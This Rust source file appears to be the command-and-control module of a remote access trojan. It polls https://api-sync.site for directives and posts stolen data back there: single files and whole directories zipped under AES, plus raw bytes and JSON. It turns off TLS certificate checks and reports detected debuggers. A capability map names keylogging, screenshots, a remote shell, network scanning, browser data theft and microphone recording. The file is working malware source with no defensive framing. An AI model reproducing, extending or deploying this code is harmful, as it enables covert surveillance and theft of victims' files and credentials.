use anyhow::Result;
use reqwest::Client;
use reqwest::Error;
use serde::Deserialize;
use serde::Serialize;
use std::fs::File;
use std::io::prelude::*;
use std::io::Read;
use std::path::Path;
use tempfile::NamedTempFile;
use walkdir::WalkDir;
use zip::result::ZipResult;
use zip::write::SimpleFileOptions;
use zip::{AesMode, CompressionMethod};

enum _Status {
    SUCCESSFUL,
    FAILED,
}
#[derive(Deserialize)]
struct Directive {
    // id: String,
    command: String,
    // status: String,
}

#[derive(Serialize)]
pub struct CommandMapping {
    pub keylogger: String,
    pub screenshot: String,
    pub logs: String,
    pub shell: String,
    pub network_scan: String,
    pub browser_info: String,
    pub mic_rec: String,
}

pub async fn send_directive_status(
    directive: &str,
    status: &str,
    message: &str,
) -> Result<(), reqwest::Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let body = serde_json::json!({
        "directive": directive,
        "status": status,
        "message": message
    });

    let res = client
        .post("https://api-sync.site/sync")
        .json(&body)
        .send()
        .await;

    if let Err(e) = res {
        eprintln!("Erreur lors de l'envoi du statut : {:?}", e);
    }

    Ok(())
}

pub async fn get_directives() -> Result<Vec<String>, Error> {
    let url = "https://api-sync.site/directives";

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client.get(url).send().await?.error_for_status()?;

    let directives: Vec<Directive> = response.json().await?;

    let commands: Vec<String> = directives
        .into_iter()
        .map(|directive| directive.command)
        .collect();

    Ok(commands)
}

pub async fn send_json_to_c2<T: Serialize>(data: &T) -> Result<()> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://api-sync.site/directives")
        .header("Content-Type", "application/json")
        .json(data)
        .send()
        .await?;

    Ok(())
}

pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://api-sync.site/directives")
        .header("Content-Type", "text/plain")
        .body(data)
        .send()
        .await?;

    Ok(())
}

pub async fn zip_file(filename: &Path) -> ZipResult<NamedTempFile> {
    let mut tmp_archive = NamedTempFile::new()?;
    {
        let mut zip = zip::ZipWriter::new(&mut tmp_archive);

        let mut file = File::open(filename)?;
        let mut buff = Vec::new();
        file.read_to_end(&mut buff)?;

        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, "password");

        let archive_name = filename.file_name().unwrap_or_default().to_string_lossy();

        zip.start_file(archive_name, options)?;
        zip.write_all(&buff)?;
        zip.finish()?;
    }

    Ok(tmp_archive)
}

pub async fn zip_dir(folder_path: &Path) -> ZipResult<NamedTempFile> {
    let mut tmp_archive = NamedTempFile::new()?;
    {
        let mut zip = zip::ZipWriter::new(&mut tmp_archive);

        let options = SimpleFileOptions::default()
            .compression_method(CompressionMethod::Deflated)
            .with_aes_encryption(AesMode::Aes256, "password");

        for entry in WalkDir::new(folder_path).into_iter().filter_map(Result::ok) {
            let path = entry.path();
            let relative_path = path.strip_prefix(folder_path).unwrap();

            if path.is_dir() {
                if !relative_path.as_os_str().is_empty() {
                    zip.add_directory(relative_path.to_string_lossy(), options)?;
                }
            } else if path.is_file() {
                let mut f = File::open(path)?;
                let mut buffer = Vec::new();
                f.read_to_end(&mut buffer)?;

                zip.start_file(relative_path.to_string_lossy(), options)?;
                zip.write_all(&buffer)?;
            }
        }

        zip.finish()?;
    }

    Ok(tmp_archive)
}

pub async fn send_zip_to_c2(filepath: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let file_bytes = tokio::fs::read(filepath).await?;

    let response = client
        .post("https://api-sync.site/directives")
        .header("Content-Type", "application/zip")
        .body(file_bytes)
        .send()
        .await?;

    println!("Status: {}", response.status());
    Ok(())
}

pub async fn send_mapping(mapping: &CommandMapping) -> Result<(), reqwest::Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let res = client
        .post("https://api-sync.site/mapping")
        .json(mapping)
        .send()
        .await;

    if let Err(e) = res {
        eprintln!("Erreur lors de l'envoi du mapping : {:?}", e);
        return Err(e);
    }

    Ok(())
}

pub async fn send_anti_debug_alert() {
    let _ = send_directive_status("anti_debug", "warning", "Debugger détecté").await;
}

pub async fn ping_c2() -> Result<(), Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://api-sync.site/directives")
        .body("loadcapacity 37")
        .send()
        .await?;

    Ok(())
}
